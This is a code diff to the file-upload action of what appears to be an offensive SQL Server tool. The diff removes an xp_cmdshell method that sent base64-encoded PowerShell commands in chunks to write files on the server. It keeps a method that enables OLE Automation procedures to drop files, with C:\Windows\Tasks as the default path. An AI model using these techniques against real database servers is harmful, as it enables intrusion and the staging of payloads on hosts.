@@ -13,12 +13,10 @@ namespace MSSQLand.Actions.FileSystem
     /// Upload a local file to the SQL Server filesystem.
     /// 
     /// This action reads a file from the local filesystem and writes it to a
-    /// remote path on the SQL Server using OLE Automation (ADODB.Stream) or
-    /// xp_cmdshell with PowerShell. After upload, it verifies the file was created.
+    /// remote path on the SQL Server using OLE Automation (ADODB.Stream).
+    /// After upload, it verifies the file was created.
     /// 
-    /// Methods used (in order of preference):
-    /// 1. OLE Automation with ADODB.Stream (most compatible, handles binary data well)
-    /// 2. xp_cmdshell with PowerShell -EncodedCommand (if OLE is disabled, chunked for large files)
+    /// Method used: OLE Automation with ADODB.Stream (handles binary data well)
     /// </summary>
     internal class Upload : BaseAction
     {
@@ -27,9 +25,6 @@ namespace MSSQLand.Actions.FileSystem
 
         [ArgumentMetadata(Position = 1, Description = "Remote destination path (defaults to C:\\Windows\\Tasks\\)")]
         private string _remotePath = "";
-
-        [ArgumentMetadata(ShortName = "x", LongName = "xpcmd", Description = "Force xp_cmdshell method (use if xp_cmdshell is already enabled)")]
-        private bool _forceXpCmdshell = false;
 
         private FileInfo _localFileInfo;
 
@@ -40,9 +35,6 @@ namespace MSSQLand.Actions.FileSystem
         public override void ValidateArguments(string[] args)
         {
             var (namedArgs, positionalArgs) = ParseActionArguments(args);
-
-            // Check for --xpcmd flag
-            _forceXpCmdshell = namedArgs.ContainsKey("xpcmd") || namedArgs.ContainsKey("x");
 
             // Get local path from positional argument
             _localPath = GetPositionalArgument(positionalArgs, 0, null);
@@ -114,38 +106,17 @@ namespace MSSQLand.Actions.FileSystem
                 return false;
             }
 
-            bool success;
+            // Try to enable OLE Automation
+            bool oleAvailable = databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1);
 
-            // If user explicitly requested xp_cmdshell method
-            if (_forceXpCmdshell)
+            if (!oleAvailable)
             {
-                Logger.Info("Using xp_cmdshell method (--xpcmd flag)");
-                success = UploadViaXpCmdshell(databaseContext, fileContent, skipEnableAttempt: true);
+                Logger.Error("Cannot enable OLE Automation (no ALTER SETTINGS permission)");
+                return false;
             }
-            else
-            {
-                // Try OLE Automation first
-                bool oleAvailable = databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1);
 
-                if (oleAvailable)
-                {
-                    Logger.Info("OLE Automation is available, using OLE method");
-                    success = UploadViaOle(databaseContext, fileContent);
-                    
-                    // If OLE upload failed, suggest xp_cmdshell as alternative
-                    if (!success)
-                    {
-                        Logger.Warning("OLE method failed.");
-                    }
-                }
-                else
-                {
-                    // OLE config couldn't be enabled - don't auto-fallback to xp_cmdshell
-                    // as it will likely fail too. Let user explicitly request it.
-                    Logger.Error("Cannot enable OLE Automation (no ALTER SETTINGS permission)");
-                    return false;
-                }
-            }
+            Logger.Info("OLE Automation is available, using OLE method");
+            bool success = UploadViaOle(databaseContext, fileContent);
 
             if (!success)
             {
@@ -294,90 +265,5 @@ EXEC sp_OADestroy @ObjectToken;
             }
         }
 
-        /// <summary>
-        /// Upload file using xp_cmdshell with PowerShell -EncodedCommand.
-        /// </summary>
-        /// <param name="databaseContext">The database context.</param>
-        /// <param name="fileContent">The file content as bytes.</param>
-        /// <param name="skipEnableAttempt">Skip trying to enable xp_cmdshell (assume it's already enabled).</param>
-        /// <returns>True if upload succeeded; otherwise false.</returns>
-        private bool UploadViaXpCmdshell(DatabaseContext databaseContext, byte[] fileContent, bool skipEnableAttempt = false)
-        {
-            // Enable xp_cmdshell if needed (unless caller says skip)
-            if (!skipEnableAttempt && !databaseContext.ConfigService.SetConfigurationOption("xp_cmdshell", 1))
-            {
-                Logger.Error("Failed to enable xp_cmdshell");
-                return false;
-            }
-
-            Logger.Info("Uploading file via xp_cmdshell (PowerShell -EncodedCommand)");
-
-            // Convert file content to base64 for embedding in PowerShell script
-            string fileBase64 = Convert.ToBase64String(fileContent);
-
-            // Escape single quotes in remote path for PowerShell
-            string escapedRemotePath = _remotePath.Replace("'", "''");
-
-            // Determine chunk size for large files
-            // Encoded command has limits, be conservative
-            const int maxChunkSize = 4000; // Conservative limit for base64 data in script
-
-            try
-            {
-                if (fileBase64.Length <= maxChunkSize)
-                {
-                    // Small file - single command
-                    string psScript = $"$d=[Convert]::FromBase64String('{fileBase64}');[IO.File]::WriteAllBytes('{escapedRemotePath}',$d)";
-
-                    // Encode PowerShell script to base64 UTF-16LE for -EncodedCommand
-                    string encodedCommand = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
-
-                    string query = $"EXEC master..xp_cmdshell 'powershell -e {encodedCommand}'";
-                    databaseContext.QueryService.ExecuteNonProcessing(query);
-                    Logger.Info("PowerShell upload command executed");
-                }
-                else
-                {
-                    // Large file - write in chunks
-                    int totalChunks = (fileBase64.Length + maxChunkSize - 1) / maxChunkSize;
-                    Logger.Info($"Large file detected, uploading in {totalChunks} chunks");
-
-                    // First chunk - create new file
-                    string chunk = fileBase64.Substring(0, Math.Min(maxChunkSize, fileBase64.Length));
-                    string psScript = $"$d=[Convert]::FromBase64String('{chunk}');[IO.File]::WriteAllBytes('{escapedRemotePath}',$d)";
-                    string encodedCommand = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
-                    string query = $"EXEC master..xp_cmdshell 'powershell -e {encodedCommand}'";
-                    databaseContext.QueryService.ExecuteNonProcessing(query);
-                    Logger.Info("Chunk 1 uploaded");
-
-                    // Remaining chunks - append
-                    int offset = maxChunkSize;
-                    int chunkNum = 2;
-                    while (offset < fileBase64.Length)
-                    {
-                        chunk = fileBase64.Substring(offset, Math.Min(maxChunkSize, fileBase64.Length - offset));
-
-                        // Use FileStream to append (compatible with all PS versions)
-                        psScript = $"$d=[Convert]::FromBase64String('{chunk}');$f=[IO.File]::Open('{escapedRemotePath}',[IO.FileMode]::Append);$f.Write($d,0,$d.Length);$f.Close()";
-                        encodedCommand = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));
-                        query = $"EXEC master..xp_cmdshell 'powershell -e {encodedCommand}'";
-
-                        databaseContext.QueryService.ExecuteNonProcessing(query);
-
-                        offset += maxChunkSize;
-                        Logger.Info($"Chunk {chunkNum}/{totalChunks} uploaded");
-                        chunkNum++;
-                    }
-                }
-
-                Logger.Success("PowerShell upload completed");
-                return true;
-            }
-            catch (Exception ex)
-            {
-                Logger.Error($"PowerShell upload failed: {ex.Message}");
-                return false;
-            }
-        }
     }
 }
